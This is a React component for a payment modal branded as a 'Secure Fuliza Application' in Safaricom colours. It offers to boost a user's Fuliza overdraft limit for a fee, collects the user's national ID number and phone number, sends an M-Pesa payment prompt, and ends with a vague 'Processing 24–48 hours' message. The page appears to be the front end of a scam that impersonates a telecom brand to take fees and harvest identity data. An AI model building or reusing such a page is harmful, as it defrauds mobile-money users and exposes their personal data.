import React, { useState, useEffect } from "react";
import { SAFARICOM_GREEN, SUPPORT } from "../utils/constants";

export default function PaymentModal({
  isOpen,
  onClose,
  onInitiatePayment,
  onCheckPayment,
  paymentState,
  selectedLimit,
  selectedFee,
}) {
  const [idNumber, setIdNumber] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [currentStep, setCurrentStep] = useState("input");

  useEffect(() => {
    if (isOpen && paymentState.phone) {
      setPhoneNumber(paymentState.phone);
    }
  }, [isOpen, paymentState.phone]);

  // ✅ FIX: Normalize phone format (07 → 254)
  const formatPhone = (phone) => {
    if (!phone) return "";
    return phone.startsWith("0") ? "254" + phone.slice(1) : phone;
  };

  const handleInitiate = async () => {
    if (!phoneNumber || !idNumber) {
      alert("Please fill all details");
      return;
    }

    try {
      setCurrentStep("response");

      const payload = {
        phone: formatPhone(phoneNumber),
        amount: selectedFee,
        idNumber,
      };

      await onInitiatePayment(payload);
    } catch (error) {
      alert(error.message);
      setCurrentStep("input");
    }
  };

  const handleCheckPayment = async () => {
    await onCheckPayment();

    if (paymentState.status === "completed") {
      setCurrentStep("success");
    }
  };

  const handleClose = () => {
    setCurrentStep("input");
    setIdNumber("");
    setPhoneNumber("");
    onClose();
  };

  const handleSuccessClose = () => {
    setCurrentStep("input");
    setIdNumber("");
    setPhoneNumber("");
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div
      id="paymentModal"
      className="fixed inset-0 bg-black/60 flex items-center justify-center p-4 z-[300] backdrop-blur-sm"
    >
      <div className="bg-white rounded-[2rem] overflow-hidden w-full max-w-sm shadow-2xl">

        {/* HEADER */}
        <div
          className="p-6 text-white text-center"
          style={{ backgroundColor: SAFARICOM_GREEN }}
        >
          <p className="text-[10px] font-bold uppercase tracking-widest opacity-80 mb-1">
            Secure Fuliza Application
          </p>

          <h3 className="text-xl font-extrabold">
            Boost To Ksh {selectedLimit?.toLocaleString() || 0}
          </h3>
        </div>

        <div className="p-6">

          {/* INPUT STEP */}
          {currentStep === "input" && (
            <>
              <div className="bg-green-50 p-4 rounded-xl mb-6">
                <p className="text-[11px] text-green-800 font-semibold">
                  Enter ID and Safaricom number to receive STK prompt
                </p>
              </div>

              <input
                type="number"
                value={idNumber}
                onChange={(e) => setIdNumber(e.target.value)}
                placeholder="ID Number"
                className="w-full mb-3 px-4 py-4 bg-slate-50 border rounded-xl font-bold"
                style={{ borderColor: SAFARICOM_GREEN }}
              />

              <input
                type="number"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder="07XXXXXXXX"
                className="w-full mb-6 px-4 py-4 bg-slate-50 border rounded-xl font-bold"
                style={{ borderColor: SAFARICOM_GREEN }}
              />

              <div className="flex gap-3">
                <button
                  onClick={handleClose}
                  className="flex-1 py-4 bg-slate-100 text-slate-500 font-bold rounded-xl"
                >
                  Cancel
                </button>

                <button
                  onClick={handleInitiate}
                  className="flex-[2] py-4 text-white font-bold rounded-xl"
                  style={{ backgroundColor: SAFARICOM_GREEN }}
                >
                  Pay Ksh {selectedFee || 0}
                </button>
              </div>
            </>
          )}

          {/* RESPONSE STEP */}
          {currentStep === "response" && (
            <div className="py-8 text-center">

              <div className="w-12 h-12 border-4 border-green-500 border-t-transparent rounded-full animate-spin mx-auto mb-4" />

              <h4 className="text-lg font-bold">
                Sending M-Pesa Prompt
              </h4>

              <p className="text-sm text-slate-500 mt-2">
                Check your phone and enter PIN
              </p>

              <div className="bg-slate-50 p-4 rounded-2xl mt-5 text-left">

                <div className="flex justify-between py-2 border-b">
                  <span className="text-xs font-bold text-slate-400">Amount</span>
                  <span className="font-bold text-green-700">
                    Ksh {selectedFee || 0}
                  </span>
                </div>

                <div className="flex justify-between py-2 border-b">
                  <span className="text-xs font-bold text-slate-400">Phone</span>
                  <span className="font-bold text-slate-700">
                    {paymentState.phone || "—"}
                  </span>
                </div>

                <div className="flex justify-between py-2">
                  <span className="text-xs font-bold text-slate-400">Status</span>
                  <span className="font-bold text-slate-700">
                    {paymentState.status || "Pending"}
                  </span>
                </div>

              </div>

              <button
                onClick={handleCheckPayment}
                className="mt-6 w-full bg-green-600 text-white p-3 rounded-xl font-bold"
              >
                I Have Paid
              </button>

              <button onClick={handleClose} className="mt-3 text-sm">
                Cancel
              </button>
            </div>
          )}

          {/* SUCCESS STEP */}
          {currentStep === "success" && (
            <div className="text-center py-6">

              <h3 className="text-xl font-bold text-green-600">
                Request Received
              </h3>

              <p className="text-sm mt-2">
                Processing 24–48 hours
              </p>

              <button
                onClick={handleSuccessClose}
                className="mt-6 w-full bg-slate-200 p-3 rounded-xl"
              >
                Back to Home
              </button>

            </div>
          )}

        </div>
      </div>
    </div>
  );
}